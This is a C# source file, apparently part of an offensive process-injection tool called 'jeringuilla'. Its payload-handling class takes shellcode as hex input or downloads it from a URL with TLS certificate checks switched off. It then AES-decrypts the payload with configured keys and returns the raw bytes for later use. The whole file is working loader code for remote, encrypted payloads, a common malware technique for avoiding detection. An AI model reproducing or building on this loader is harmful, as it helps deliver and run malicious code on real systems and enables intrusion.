using System;
using System.IO;
using System.Text;

using static jeringuilla.Configuration;
using static jeringuilla.HelperFunctions;

namespace jeringuilla
{
    internal class PayloadFunctions
    {
        public static byte[] ToByteArray(String hexString)
        {
            byte[] retval = new byte[hexString.Length / 2];
            for (int i = 0; i < hexString.Length; i += 2)
                retval[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            return retval;
        }


        static byte[] tryToDecryptString(String payload_str)
        {
            try
            {
                String decryptedPayload = DecryptStringFromBytes(payload_str, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
                Console.WriteLine("[+] It was possible to decrypt the payload.");
                return decryptedBytes;
            }
            catch
            {
                // Console.WriteLine("[-] It was not possible to decrypt the payload - Probably not using AES encryption.");
                return ToByteArray(payload_str);
            }
        }


        static byte[] tryToDecryptFile(byte[] encryptedBytes)
        {
            try
            {
                String encryptedPayload = Convert.ToBase64String(encryptedBytes);
                String decryptedPayload = DecryptStringFromBytes(encryptedPayload, Encoding.ASCII.GetBytes(payload_aes_password), Encoding.ASCII.GetBytes(payload_aes_iv));
                byte[] decryptedBytes = Convert.FromBase64String(decryptedPayload);
                Console.WriteLine("[+] It was possible to decrypt the payload.");
                return decryptedBytes;
            }
            catch
            {
                // Console.WriteLine("[-] It was not possible to decrypt the file - Probably not using AES encryption.");
                return encryptedBytes;

            }
        }


        public static byte[] getPayload(String payload_str)
        {
            // Payload from standard input
            if (payload_str == null)
            {
                byte[] inputBuffer = new byte[1024];
                Stream inputStream = Console.OpenStandardInput(inputBuffer.Length);
                Console.SetIn(new StreamReader(inputStream, Console.InputEncoding, false, inputBuffer.Length));
                Console.WriteLine("[+] Write hexadecimal payload or url (or Enter to exit):");
                payload_str = Console.ReadLine();
            }

            byte[] buf = { };
            if (payload_str == "")
            {
                Console.WriteLine("[-] Exiting...");
                System.Environment.Exit(0);
            }

            // Payload from url, http or https
            else if (payload_str.Substring(0, 4) == "http")
            {
                Console.WriteLine("[+] Getting payload from url: " + payload_str);
                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
                using (System.Net.WebClient myWebClient = new System.Net.WebClient())
                {
                    try
                    {
                        System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                        buf = myWebClient.DownloadData(payload_str);
                        buf = tryToDecryptFile(buf);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }

            }

            // Hexadecimal payload
            else
            {
                buf = tryToDecryptString(payload_str);
            }

            return buf;
        }
    }
}
